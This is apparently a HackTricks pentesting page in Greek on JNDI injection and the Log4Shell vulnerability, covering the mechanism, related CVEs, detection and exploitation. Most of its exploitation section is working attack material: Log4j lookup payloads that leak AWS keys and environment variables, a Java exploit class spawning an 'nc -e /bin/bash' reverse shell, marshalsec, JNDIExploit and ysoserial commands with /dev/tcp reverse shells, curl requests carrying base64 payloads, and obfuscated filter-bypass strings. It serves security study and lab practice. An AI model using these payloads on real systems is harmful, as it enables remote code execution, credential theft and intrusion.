# JNDI - Java Naming and Directory Interface & Log4Shell

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

JNDI, ενσωματωμένο στην Java από τα τέλη της δεκαετίας του 1990, λειτουργεί ως υπηρεσία καταλόγου, επιτρέποντας στα προγράμματα Java να εντοπίζουν δεδομένα ή αντικείμενα μέσω ενός συστήματος ονοματοδοσίας. Υποστηρίζει διάφορες υπηρεσίες καταλόγου μέσω διεπαφών παρόχων υπηρεσιών (SPIs), επιτρέποντας την ανάκτηση δεδομένων από διαφορετικά συστήματα, συμπεριλαμβανομένων απομακρυσμένων αντικειμένων Java. Κοινές SPIs περιλαμβάνουν CORBA COS, Java RMI Registry και LDAP.

### JNDI Naming Reference

Τα αντικείμενα Java μπορούν να αποθηκευτούν και να ανακτηθούν χρησιμοποιώντας JNDI Naming References, οι οποίες έρχονται σε δύο μορφές:

- **Reference Addresses**: Προσδιορίζει την τοποθεσία ενός αντικειμένου (π.χ., _rmi://server/ref_), επιτρέποντας άμεση ανάκτηση από τη συγκεκριμένη διεύθυνση.
- **Remote Factory**: Αναφέρεται σε μια απομακρυσμένη κλάση εργοστασίου. Όταν προσπελαστεί, η κλάση κατεβαίνει και δημιουργείται από την απομακρυσμένη τοποθεσία.

Ωστόσο, αυτός ο μηχανισμός μπορεί να εκμεταλλευτεί, ενδεχομένως οδηγώντας στη φόρτωση και εκτέλεση αυθαίρετου κώδικα. Ως αντεπίθεση:

- **RMI**: `java.rmi.server.useCodeabseOnly = true` από προεπιλογή από το JDK 7u21, περιορίζοντας τη φόρτωση απομακρυσμένων αντικειμένων. Ένας Security Manager περιορίζει περαιτέρω τι μπορεί να φορτωθεί.
- **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` από προεπιλογή από το JDK 6u141, 7u131, 8u121, αποκλείοντας την εκτέλεση απομακρυσμένων φορτωμένων αντικειμένων Java. Εάν οριστεί σε `true`, είναι δυνατή η εκτέλεση απομακρυσμένου κώδικα χωρίς την εποπτεία ενός Security Manager.
- **CORBA**: Δεν έχει συγκεκριμένη ιδιότητα, αλλά ο Security Manager είναι πάντα ενεργός.

Ωστόσο, ο **Naming Manager**, υπεύθυνος για την επίλυση των συνδέσμων JNDI, στερείται ενσωματωμένων μηχανισμών ασφαλείας, επιτρέποντας ενδεχομένως την ανάκτηση αντικειμένων από οποιαδήποτε πηγή. Αυτό θέτει σε κίνδυνο καθώς οι προστασίες RMI, LDAP και CORBA μπορούν να παρακαμφθούν, οδηγώντας στη φόρτωση αυθαίρετων αντικειμένων Java ή στην εκμετάλλευση υπαρχόντων συστατικών εφαρμογών (gadgets) για την εκτέλεση κακόβουλου κώδικα.

Παραδείγματα εκμεταλλεύσιμων URLs περιλαμβάνουν:

- _rmi://attacker-server/bar_
- _ldap://attacker-server/bar_
- _iiop://attacker-server/bar_

Παρά τις προστασίες, οι ευπάθειες παραμένουν, κυρίως λόγω της έλλειψης προστατευτικών μέτρων κατά της φόρτωσης JNDI από μη αξιόπιστες πηγές και της δυνατότητας παράκαμψης των υπαρχουσών προστασιών.

### JNDI Example

![](<../../images/image (1022).png>)

Ακόμα και αν έχετε ορίσει ένα **`PROVIDER_URL`**, μπορείτε να υποδείξετε ένα διαφορετικό σε μια αναζήτηση και θα προσπελαστεί: `ctx.lookup("<attacker-controlled-url>")` και αυτό είναι που θα εκμεταλλευτεί ένας επιτιθέμενος για να φορτώσει αυθαίρετα αντικείμενα από ένα σύστημα που ελέγχει.

### CORBA Overview

CORBA (Common Object Request Broker Architecture) χρησιμοποιεί μια **Interoperable Object Reference (IOR)** για να προσδιορίσει μοναδικά απομακρυσμένα αντικείμενα. Αυτή η αναφορά περιλαμβάνει βασικές πληροφορίες όπως:

- **Type ID**: Μοναδικός αναγνωριστικός αριθμός για μια διεπαφή.
- **Codebase**: URL για την απόκτηση της κλάσης stub.

Σημειωτέον, η CORBA δεν είναι εγγενώς ευάλωτη. Η εξασφάλιση της ασφάλειας συνήθως περιλαμβάνει:

- Εγκατάσταση ενός **Security Manager**.
- Ρύθμιση του Security Manager για να επιτρέπει συνδέσεις σε ενδεχομένως κακόβουλες βάσεις κώδικα. Αυτό μπορεί να επιτευχθεί μέσω:
- Άδειας socket, π.χ., `permissions java.net.SocketPermission "*:1098-1099", "connect";`.
- Άδειες ανάγνωσης αρχείων, είτε καθολικά (`permission java.io.FilePermission "<<ALL FILES>>", "read";`) είτε για συγκεκριμένους καταλόγους όπου μπορεί να τοποθετηθούν κακόβουλα αρχεία.

Ωστόσο, ορισμένες πολιτικές προμηθευτών μπορεί να είναι επιεικείς και να επιτρέπουν αυτές τις συνδέσεις από προεπιλογή.

### RMI Context

Για το RMI (Remote Method Invocation), η κατάσταση είναι κάπως διαφορετική. Όπως και με την CORBA, η αυθαίρετη λήψη κλάσεων περιορίζεται από προεπιλογή. Για να εκμεταλλευτεί κανείς το RMI, θα χρειαστεί συνήθως να παρακάμψει τον Security Manager, μια πράξη που είναι επίσης σχετική με την CORBA.

### LDAP

Πρώτα απ' όλα, πρέπει να διακρίνουμε μεταξύ μιας Αναζήτησης και μιας Αναζήτησης Ονόματος.\
Μια **αναζήτηση** θα χρησιμοποιήσει ένα URL όπως `ldap://localhost:389/o=JNDITutorial` για να βρει το αντικείμενο JNDITutorial από έναν LDAP server και **να ανακτήσει τα χαρακτηριστικά του**.\
Μια **αναζήτηση ονόματος** προορίζεται για **υπηρεσίες ονοματοδοσίας** καθώς θέλουμε να πάρουμε **οτιδήποτε είναι δεσμευμένο σε ένα όνομα**.

Εάν η αναζήτηση LDAP κλήθηκε με **SearchControls.setReturningObjFlag() με `true`, τότε το επιστρεφόμενο αντικείμενο θα ανακατασκευαστεί**.

Επομένως, υπάρχουν αρκετοί τρόποι για να επιτεθεί κανείς σε αυτές τις επιλογές.\
Ένας **επιτιθέμενος μπορεί να δηλητηριάσει τις εγγραφές LDAP εισάγοντας payloads** σε αυτές που θα εκτελούνται στα συστήματα που τις συλλέγουν (πολύ χρήσιμο για **να συμβιβάσει δεκάδες μηχανές** αν έχετε πρόσβαση στον LDAP server). Ένας άλλος τρόπος εκμετάλλευσης αυτού θα ήταν να εκτελέσει μια **επίθεση MitM σε μια αναζήτηση LDAP** για παράδειγμα.

Σε περίπτωση που μπορείτε να **κάνετε μια εφαρμογή να επιλύσει μια JNDI LDAP UR**L, μπορείτε να ελέγξετε τον LDAP που θα αναζητηθεί, και θα μπορούσατε να στείλετε πίσω την εκμετάλλευση (log4shell).

#### Deserialization exploit

![](<../../images/image (275).png>)

Η **εκμετάλλευση είναι σειριοποιημένη** και θα αποσειριοποιηθεί.\
Σε περίπτωση που το `trustURLCodebase` είναι `true`, ένας επιτιθέμενος μπορεί να παρέχει τις δικές του κλάσεις στη βάση κώδικα, αλλιώς θα χρειαστεί να εκμεταλλευτεί gadgets στο classpath.

#### JNDI Reference exploit

Είναι πιο εύκολο να επιτεθεί κανείς σε αυτό το LDAP χρησιμοποιώντας **JavaFactory references**:

![](<../../images/image (1059).png>)

## Log4Shell Vulnerability

Η ευπάθεια εισάγεται στο Log4j επειδή υποστηρίζει μια [**ειδική σύνταξη**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) με τη μορφή `${prefix:name}` όπου το `prefix` είναι ένα από έναν αριθμό διαφορετικών [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html) όπου το `name` θα πρέπει να αξιολογηθεί. Για παράδειγμα, `${java:version}` είναι η τρέχουσα εκτελούμενη έκδοση της Java.

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) εισήγαγε μια δυνατότητα αναζήτησης `jndi`. Αυτή η δυνατότητα επιτρέπει την ανάκτηση μεταβλητών μέσω JNDI. Συνήθως, το κλειδί προεπιλέγεται αυτόματα με το `java:comp/env/`. Ωστόσο, εάν το κλειδί περιλαμβάνει ένα **":"**, αυτό το προεπιλεγμένο πρόθεμα δεν εφαρμόζεται.

Με ένα **: παρόν** στο κλειδί, όπως στο `${jndi:ldap://example.com/a}` δεν υπάρχει **πρόθεμα** και ο **LDAP server ερωτάται για το αντικείμενο**. Και αυτές οι αναζητήσεις μπορούν να χρησιμοποιηθούν τόσο στη διαμόρφωση του Log4j όσο και όταν καταγράφονται γραμμές.

Επομένως, το μόνο που χρειάζεται για να αποκτήσετε RCE είναι μια **ευάλωτη έκδοση του Log4j που επεξεργάζεται πληροφορίες που ελέγχονται από τον χρήστη**. Και επειδή αυτή είναι μια βιβλιοθήκη που χρησιμοποιείται ευρέως από εφαρμογές Java για την καταγραφή πληροφοριών (συμπεριλαμβανομένων των εφαρμογών που είναι εκτεθειμένες στο Διαδίκτυο), ήταν πολύ συνηθισμένο να έχει το log4j να καταγράφει, για παράδειγμα, HTTP headers που λαμβάνονται όπως το User-Agent. Ωστόσο, το log4j **δεν χρησιμοποιείται μόνο για την καταγραφή HTTP πληροφοριών αλλά οποιαδήποτε είσοδο** και δεδομένα που υποδεικνύει ο προγραμματιστής.

## Overview of Log4Shell-Related CVEs

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Critical]**

Αυτή η ευπάθεια είναι μια κρίσιμη **ευπάθεια μη αξιόπιστης αποσειριοποίησης** στο συστατικό `log4j-core`, που επηρεάζει εκδόσεις από 2.0-beta9 έως 2.14.1. Επιτρέπει **απομακρυσμένη εκτέλεση κώδικα (RCE)**, επιτρέποντας στους επιτιθέμενους να καταλάβουν συστήματα. Το ζήτημα αναφέρθηκε από τον Chen Zhaojun από την ομάδα ασφάλειας της Alibaba Cloud και επηρεάζει διάφορα πλαίσια Apache. Η αρχική διόρθωση στην έκδοση 2.15.0 ήταν ελλιπής. Οι κανόνες Sigma για άμυνα είναι διαθέσιμοι ([Rule 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j_fields.yml), [Rule 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j.yml)).

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **\[Critical]**

Αρχικά αξιολογήθηκε ως χαμηλή αλλά αργότερα αναβαθμίστηκε σε κρίσιμη, αυτή η CVE είναι μια **ευπάθεια Άρνησης Υπηρεσίας (DoS)** που προκύπτει από μια ελλιπή διόρθωση στην 2.15.0 για την CVE-2021-44228. Επηρεάζει μη προεπιλεγμένες ρυθμίσεις, επιτρέποντας στους επιτιθέμενους να προκαλέσουν επιθέσεις DoS μέσω κατασκευασμένων payloads. Ένα [tweet](https://twitter.com/marcioalm/status/1471740771581652995) παρουσιάζει μια μέθοδο παράκαμψης. Το ζήτημα επιλύθηκε στις εκδόσεις 2.16.0 και 2.12.2 με την αφαίρεση προτύπων αναζήτησης μηνυμάτων και την απενεργοποίηση του JNDI από προεπιλογή.

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[High]**

Επηρεάζει **εκδόσεις Log4j 1.x** σε μη προεπιλεγμένες ρυθμίσεις που χρησιμοποιούν `JMSAppender`, αυτή η CVE είναι μια ευπάθεια μη αξιόπιστης αποσειριοποίησης. Δεν είναι διαθέσιμη διόρθωση για τον κλάδο 1.x, ο οποίος είναι εκτός υποστήριξης, και συνιστάται η αναβάθμιση στο `log4j-core 2.17.0`.

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[Moderate]**

Αυτή η ευπάθεια επηρεάζει το **Logback logging framework**, διάδοχο του Log4j 1.x. Προηγουμένως θεωρούμενο ασφαλές, το πλαίσιο βρέθηκε ευάλωτο, και νέες εκδόσεις (1.3.0-alpha11 και 1.2.9) έχουν κυκλοφορήσει για να αντιμετωπίσουν το ζήτημα.

### **CVE-2021-45105** **\[High]**

Το Log4j 2.16.0 περιέχει μια ευπάθεια DoS, οδηγώντας στην κυκλοφορία του `log4j 2.17.0` για να διορθώσει την CVE. Περισσότερες λεπτομέρειες υπάρχουν στην [αναφορά του BleepingComputer](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/).

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)

Επηρεάζει την έκδοση log4j 2.17, αυτή η CVE απαιτεί από τον επιτιθέμενο να ελέγχει το αρχείο ρύθμισης log4j. Περιλαμβάνει πιθανή αυθαίρετη εκτέλεση κώδικα μέσω ενός ρυθμισμένου JDBCAppender. Περισσότερες λεπτομέρειες είναι διαθέσιμες στην [ανάρτηση του Checkmarx](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/).

## Log4Shell Exploitation

### Discovery

Αυτή η ευπάθεια είναι πολύ εύκολη να ανακαλυφθεί αν δεν προστατεύεται, καθώς θα στείλει τουλάχιστον ένα **DNS request** στη διεύθυνση που υποδεικνύετε στο payload σας. Επομένως, payloads όπως:

- `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` (χρησιμοποιώντας [canarytokens.com](https://canarytokens.org/generate))
- `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` (χρησιμοποιώντας [interactsh](https://github.com/projectdiscovery/interactsh))
- `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (χρησιμοποιώντας Burp Suite)
- `${jndi:ldap://2j4ayo.dnslog.cn}` (χρησιμοποιώντας [dnslog](http://dnslog.cn))
- `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` (χρησιμοποιώντας [huntress](https://log4shell.huntress.com))

Σημειώστε ότι **ακόμα και αν ληφθεί ένα DNS request, αυτό δεν σημαίνει ότι η εφαρμογή είναι εκμεταλλεύσιμη** (ή ακόμα και ευάλωτη), θα χρειαστεί να προσπαθήσετε να την εκμεταλλευτείτε.

> [!NOTE]
> Θυμηθείτε ότι για να **εκμεταλλευτείτε την έκδοση 2.15** πρέπει να προσθέσετε την **παράκαμψη ελέγχου localhost**: ${jndi:ldap://**127.0.0.1#**...}

#### **Local Discovery**

Αναζητήστε **τοπικές ευάλωτες εκδόσεις** της βιβλιοθήκης με:
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **Επαλήθευση**

Ορισμένες από τις πλατφόρμες που αναφέρθηκαν προηγουμένως θα σας επιτρέψουν να εισάγετε ορισμένα μεταβλητά δεδομένα που θα καταγραφούν όταν ζητηθούν.\
Αυτό μπορεί να είναι πολύ χρήσιμο για 2 πράγματα:

- Για να **επαληθεύσετε** την ευπάθεια
- Για να **εξάγετε πληροφορίες** εκμεταλλευόμενοι την ευπάθεια

Για παράδειγμα, θα μπορούσατε να ζητήσετε κάτι όπως:\
ή όπως `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** και αν γίνει **DNS request με την τιμή της env μεταβλητής**, ξέρετε ότι η εφαρμογή είναι ευάλωτη.

Άλλες πληροφορίες που θα μπορούσατε να προσπαθήσετε να **διαρρεύσετε**:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE Πληροφορίες

> [!NOTE]
> Οι υπολογιστές που τρέχουν σε εκδόσεις JDK πάνω από 6u141, 7u131 ή 8u121 είναι προστατευμένοι από την επίθεση φόρτωσης κλάσης LDAP. Αυτό οφείλεται στην προεπιλεγμένη απενεργοποίηση του `com.sun.jndi.ldap.object.trustURLCodebase`, που εμποδίζει το JNDI να φορτώσει μια απομακρυσμένη βάση κώδικα μέσω LDAP. Ωστόσο, είναι κρίσιμο να σημειωθεί ότι αυτές οι εκδόσεις **δεν είναι προστατευμένες από την επίθεση αποσειριοποίησης**.
>
> Για τους επιτιθέμενους που στοχεύουν να εκμεταλλευτούν αυτές τις υψηλότερες εκδόσεις JDK, είναι απαραίτητο να εκμεταλλευτούν ένα **έμπιστο gadget** μέσα στην εφαρμογή Java. Εργαλεία όπως το ysoserial ή το JNDIExploit χρησιμοποιούνται συχνά για αυτόν τον σκοπό. Αντίθετα, η εκμετάλλευση χαμηλότερων εκδόσεων JDK είναι σχετικά πιο εύκολη καθώς αυτές οι εκδόσεις μπορούν να χειραγωγηθούν για να φορτώσουν και να εκτελέσουν αυθαίρετες κλάσεις.
>
> Για **περισσότερες πληροφορίες** (_όπως περιορισμούς σε RMI και CORBA vectors_) **ελέγξτε την προηγούμενη ενότητα Αναφοράς Ονομάτων JNDI** ή [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)

### RCE - Marshalsec με προσαρμοσμένο payload

Μπορείτε να το δοκιμάσετε στο **THM box:** [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

Χρησιμοποιήστε το εργαλείο [**marshalsec**](https://github.com/mbechler/marshalsec) (η έκδοση jar είναι διαθέσιμη [**εδώ**](https://github.com/RandomRobbieBF/marshalsec-jar)). Αυτή η προσέγγιση δημιουργεί έναν διακομιστή παραπομπής LDAP για να ανακατευθύνει τις συνδέσεις σε έναν δευτερεύοντα διακομιστή HTTP όπου θα φιλοξενηθεί η εκμετάλλευση:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
Για να προτρέψετε τον στόχο να φορτώσει έναν κώδικα reverse shell, δημιουργήστε ένα αρχείο Java με το όνομα `Exploit.java` με το παρακάτω περιεχόμενο:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
Συγκεντρώστε το αρχείο Java σε ένα αρχείο κλάσης χρησιμοποιώντας: `javac Exploit.java -source 8 -target 8`. Στη συνέχεια, ξεκινήστε έναν **HTTP server** στον κατάλογο που περιέχει το αρχείο κλάσης με: `python3 -m http.server`. Βεβαιωθείτε ότι ο **marshalsec LDAP server** αναφέρεται σε αυτόν τον HTTP server.

Ενεργοποιήστε την εκτέλεση της κλάσης εκμετάλλευσης στον ευάλωτο web server αποστέλλοντας ένα payload που μοιάζει με:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**Σημείωση:** Αυτή η εκμετάλλευση εξαρτάται από τη ρύθμιση του Java για να επιτρέπει τη φόρτωση απομακρυσμένων κωδίκων μέσω LDAP. Αν αυτό δεν είναι επιτρεπτό, σκεφτείτε να εκμεταλλευτείτε μια αξιόπιστη κλάση για αυθαίρετη εκτέλεση κώδικα.

### RCE - **JNDIExploit**

> [!NOTE]
> Σημειώστε ότι για κάποιο λόγο ο συγγραφέας αφαίρεσε αυτό το έργο από το github μετά την ανακάλυψη του log4shell. Μπορείτε να βρείτε μια αποθηκευμένη έκδοση στο [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) αλλά αν θέλετε να σεβαστείτε την απόφαση του συγγραφέα, χρησιμοποιήστε μια διαφορετική μέθοδο για να εκμεταλλευτείτε αυτήν την ευπάθεια.
>
> Επιπλέον, δεν μπορείτε να βρείτε τον πηγαίο κώδικα στη wayback machine, οπότε είτε αναλύστε τον πηγαίο κώδικα, είτε εκτελέστε το jar γνωρίζοντας ότι δεν ξέρετε τι εκτελείτε.

Για αυτό το παράδειγμα μπορείτε απλά να τρέξετε αυτόν τον **ευάλωτο web server για log4shell** στη θύρα 8080: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_στο README θα βρείτε πώς να το τρέξετε_). Αυτή η ευάλωτη εφαρμογή καταγράφει με μια ευάλωτη έκδοση του log4shell το περιεχόμενο της κεφαλίδας HTTP αιτήματος _X-Api-Version_.

Στη συνέχεια, μπορείτε να κατεβάσετε το αρχείο jar **JNDIExploit** και να το εκτελέσετε με:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
Μετά την ανάγνωση του κώδικα μόνο για μερικά λεπτά, στα _com.feihong.ldap.LdapServer_ και _com.feihong.ldap.HTTPServer_ μπορείτε να δείτε πώς **δημιουργούνται οι διακομιστές LDAP και HTTP**. Ο διακομιστής LDAP θα καταλάβει ποιο payload πρέπει να εξυπηρετηθεί και θα ανακατευθύνει το θύμα στον διακομιστή HTTP, ο οποίος θα εξυπηρετήσει την εκμετάλλευση.\
Στο _com.feihong.ldap.gadgets_ μπορείτε να βρείτε **ορισμένα συγκεκριμένα gadgets** που μπορούν να χρησιμοποιηθούν για να εκτελέσουν την επιθυμητή ενέργεια (πιθανώς να εκτελέσουν αυθαίρετο κώδικα). Και στο _com.feihong.ldap.template_ μπορείτε να δείτε τις διαφορετικές κλάσεις προτύπων που θα **δημιουργήσουν τις εκμεταλλεύσεις**.

Μπορείτε να δείτε όλες τις διαθέσιμες εκμεταλλεύσεις με **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. Ορισμένες χρήσιμες είναι:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
Έτσι, στο παράδειγμά μας, έχουμε ήδη αυτήν την ευάλωτη εφαρμογή docker να τρέχει. Για να την επιτεθούμε:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
Όταν στέλνετε τις επιθέσεις, θα δείτε κάποια έξοδο στο τερματικό όπου εκτελέσατε το **JNDIExploit-1.2-SNAPSHOT.jar**.

**Θυμηθείτε να ελέγξετε το `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` για άλλες επιλογές εκμετάλλευσης. Επιπλέον, σε περίπτωση που το χρειαστείτε, μπορείτε να αλλάξετε την πόρτα των διακομιστών LDAP και HTTP.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

Με παρόμοιο τρόπο με την προηγούμενη εκμετάλλευση, μπορείτε να προσπαθήσετε να χρησιμοποιήσετε [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) για να εκμεταλλευτείτε αυτήν την ευπάθεια.\
Μπορείτε να δημιουργήσετε τις διευθύνσεις URL για να στείλετε στο θύμα εκτελώντας:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_Αυτή η επίθεση χρησιμοποιώντας ένα προσαρμοσμένο παραγόμενο αντικείμενο java θα λειτουργήσει σε εργαστήρια όπως το **THM solar room**. Ωστόσο, αυτό γενικά δεν θα λειτουργήσει (καθώς από προεπιλογή η Java δεν είναι ρυθμισμένη να φορτώνει απομακρυσμένες βάσεις κώδικα χρησιμοποιώντας LDAP) νομίζω επειδή δεν εκμεταλλεύεται μια αξιόπιστη κλάση για να εκτελέσει αυθαίρετο κώδικα._

### RCE - JNDI-Injection-Exploit-Plus

[https://github.com/cckuailong/JNDI-Injection-Exploit-Plus](https://github.com/cckuailong/JNDI-Injection-Exploit-Plus) είναι ένα άλλο εργαλείο για τη δημιουργία **λειτουργικών συνδέσμων JNDI** και παρέχει υπηρεσίες υποβάθρου ξεκινώντας RMI server, LDAP server και HTTP server.\

### RCE - ysoserial & JNDI-Exploit-Kit

Αυτή η επιλογή είναι πραγματικά χρήσιμη για να επιτεθεί σε **εκδόσεις Java που είναι ρυθμισμένες να εμπιστεύονται μόνο συγκεκριμένες κλάσεις και όχι όλους**. Επομένως, **ysoserial** θα χρησιμοποιηθεί για να δημιουργήσει **σειριοποιήσεις αξιόπιστων κλάσεων** που μπορούν να χρησιμοποιηθούν ως gadgets για **να εκτελέσουν αυθαίρετο κώδικα** (_η αξιόπιστη κλάση που εκμεταλλεύεται από το ysoserial πρέπει να χρησιμοποιείται από το πρόγραμμα java του θύματος προκειμένου να λειτουργήσει η εκμετάλλευση_).

Χρησιμοποιώντας **ysoserial** ή [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) μπορείτε να δημιουργήσετε την εκμετάλλευση αποσειριοποίησης που θα κατεβεί από το JNDI:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
Χρησιμοποιήστε [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) για να δημιουργήσετε **JNDI links** όπου η εκμετάλλευση θα περιμένει συνδέσεις από τις ευάλωτες μηχανές. Μπορείτε να σερβίρετε **διαφορετικές εκμεταλλεύσεις που μπορούν να παραχθούν αυτόματα** από το JNDI-Exploit-Kit ή ακόμα και τα **δικά σας payloads αποσειριοποίησης** (παραγόμενα από εσάς ή το ysoserial).
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../images/image (1118).png>)

Τώρα μπορείτε εύκολα να χρησιμοποιήσετε έναν παραγόμενο σύνδεσμο JNDI για να εκμεταλλευτείτε την ευπάθεια και να αποκτήσετε ένα **reverse shell** στέλνοντας σε μια ευάλωτη έκδοση του log4j: **`${ldap://10.10.14.10:1389/generated}`**

### Bypasses
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ı}}:ldap://...} //Notice the unicode "i"
```
### Αυτόματοι Σαρωτές

- [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
- [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
- [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
- [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
- [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
- [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
- [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
- [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - Βρείτε τοπικές ευάλωτες βιβλιοθήκες

### Εργαστήρια για δοκιμή

- [**LogForge HTB μηχάνημα**](https://app.hackthebox.com/tracks/UHC-track)
- [**Try Hack Me Solar δωμάτιο**](https://tryhackme.com/room/solar)
- [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
